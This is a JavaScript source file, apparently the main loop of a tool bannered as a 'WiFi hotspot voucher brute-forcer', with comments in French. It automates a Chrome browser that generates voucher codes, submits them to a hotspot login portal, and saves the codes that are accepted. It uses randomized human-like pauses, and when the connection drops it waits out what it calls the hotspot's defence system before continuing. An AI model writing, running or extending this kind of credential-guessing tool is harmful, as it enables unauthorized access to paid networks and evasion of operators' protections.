import Agent from "./dependance/agent.js";
import Helper from "./dependance/Helper.js";
import config from "./dependance/config.js";

// ─── Bannière ────────────────────────────────────────────────────────────────
const VERSION = '0.1.1';
const BANNER = `
 _   _  ___ _____ _____ ___  ____   ____ _____
| | | |/ _ \\_   _|  ___/ _ \\|  _ \\ / ___| ____|
| |_| | | | || | | |_ | | | | |_) | |   |  _|
|  _  | |_| || | |  _|| |_| |  _ <| |___| |___
|_| |_|\\___/ |_| |_|   \\___/|_| \\_\\\\____|_____|

  v${VERSION}  —  WiFi hotspot voucher brute-forcer
${'─'.repeat(52)}
`;
console.log(BANNER);

// ─── Init ─────────────────────────────────────────────────────────────────────
if (config.verbose) Helper.log('Mode verbeux activé');

const agent = new Agent();
await agent.initialize();
Helper.log('✅ Chrome prêt');

const path_save_code_valide = 'code-valide.json';
const code_valide = await Helper.readJson(path_save_code_valide);

// ─── Helpers locaux ──────────────────────────────────────────────────────────
const MESSAGES_DEJA_CONNECTE = [
    'déjà connecté',
    'already connected',
    'already logged',
    'session active',
];

function isDejaConnecte(message) {
    const msg = (message || '').toLowerCase();
    return MESSAGES_DEJA_CONNECTE.some(m => msg.includes(m));
}

async function saveCode(code, message) {
    code_valide.push({ code, message });
    await Helper.saveJson(code_valide, path_save_code_valide);
    Helper.log(`✅ Code sauvegardé: ${code} | ${message}`);
}

// ─── Test d'un ticket ────────────────────────────────────────────────────────
async function testTicket(ticket) {
    const tickets = [
        ticket,
        Helper.makeTicket({ code: ticket, revert: true }),
    ];

    for (const t of tickets) {
        if (await agent.isConnected()) return true;

        Helper.log(`→ code: ${t}`);

        const maxRetries = config.loop.ticketRetries;
        for (let attempt = 1; attempt <= maxRetries; attempt++) {
            if (attempt > 1) {
                Helper.log(`   ↺ Retry ${attempt}/${maxRetries} (pause ${config.delays.retrySec}s)...`);
                await Helper.sleep(config.delays.retrySec);
            }

            const [res, message] = await agent.loginWithTicket(t);

            const url = agent.page?.url() || '';
            const connectedByUrl = config.hotspot.successUrls.some(u => url.startsWith(u));

            if (connectedByUrl) {
                await saveCode(t, `Connexion réussie (${url})`);
                return true;
            }

            if (res && !isDejaConnecte(message)) {
                await saveCode(t, message);
                return true;
            }

            if (isDejaConnecte(message)) {
                await saveCode(t, message);
                break;
            }

            Helper.logV(`   ✗ invalide (essai ${attempt}/${maxRetries})`);
        }

        await Helper.sleepHuman(3, 5);
    }
}

// ─── Pause entre essais (+ détection coupure WiFi) ───────────────────────────
async function pauseEntreEssais() {
    const enLigne = await Helper.isOnline();
    if (!enLigne) {
        Helper.log('📡 WiFi tombé — système de défense du hotspot probable.');
        const retabli = await Helper.attendreConnexion();
        if (!retabli) {
            Helper.log('❌ Connexion non rétablie — arrêt.');
            return false;
        }
        const extraSec = Helper.randomReconnectExtra();
        Helper.log(`⏳ Pause de sécurité ${extraSec}s après rétablissement...`);
        await Helper.sleep(extraSec);
    } else {
        const { minSec, maxSec } = config.delays;
        const pauseSec = minSec + Math.floor(Math.random() * (maxSec - minSec + 1));
        Helper.log(`⏳ Pause ${pauseSec}s...`);
        await Helper.sleep(pauseSec);
    }
    return true;
}

// ─── Boucle principale ───────────────────────────────────────────────────────
let i = 1;
while (true) {
    Helper.log(`\n─── Tour ${i} ───────────────────────────────────────`);

    if (await agent.isConnected()) {
        Helper.log(`🌐 Déjà connecté (${agent.page.url()}) — arrêt.`);
        break;
    }

    const ticket = Helper.makeTicket();
    const res = await testTicket(ticket);

    if (res) {
        Helper.log('🎯 Connexion réussie — arrêt.');
        break;
    }

    if (i >= config.loop.maxIterations) {
        Helper.log(`⛔ Limite atteinte (${config.loop.maxIterations} essais) — arrêt.`);
        break;
    }

    const continuer = await pauseEntreEssais();
    if (!continuer) break;

    i++;
}

await agent.close();
Helper.log('Chrome fermé. Fin du programme.');
